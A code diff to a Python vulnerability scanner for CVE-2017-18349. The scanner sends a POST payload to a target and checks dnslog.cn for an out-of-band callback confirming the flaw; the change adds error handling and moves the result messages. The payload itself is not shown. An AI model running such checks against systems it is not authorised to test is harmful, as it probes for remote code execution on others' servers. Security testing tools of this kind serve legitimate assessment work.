@@ -48,29 +48,31 @@ def chack_cve_2017_18349(target_url):
         "http": "127.0.0.1:8080",
         "https": "127.0.0.1:8080"
     }
-    sess.request(url=target_url,
-                     method="POST",
-                     # proxies=proxy,
-                     data=payload_data,
-                     headers=headers)
-    # print("http://www.dnslog.cn/getrecords.php?t=" + subdns.split(".")[0])
-    sleep(10)
+    try:
+        sess.request(url=target_url,
+                         method="POST",
+                         # proxies=proxy,
+                         data=payload_data,
+                         headers=headers)
+    except:
+        print(f"[-] Target: {target_url} CVE-2017-18349 may not exist！！！")
+        return False
 
     # 获取dnslog结果
+    sleep(10)
     res = sess.request(method="GET", url="http://www.dnslog.cn/getrecords.php?t=" + subdns.split(".")[0])
 
     # print(res.text)
     if random_str in res.text:
+        print(f"[+] Target: {target_url} CVE-2017-18349 may exist！！！")
         return True
     else:
+        print(f"[-] Target: {target_url} CVE-2017-18349 may not exist！！！")
         return False
 
 
 def vuln_scan_start(target_url):
-    if chack_cve_2017_18349(target_url):
-        print(f"[+] Target: {target_url} CVE-2017-18349 may exist！！！")
-    else:
-        print(f"[-] Target: {target_url} CVE-2017-18349 may not exist！！！")
+    chack_cve_2017_18349(target_url)
 
 
-vuln_scan_start("http://192.168.12.130:8090")
+# vuln_scan_start("http://192.168.12.130:8090")
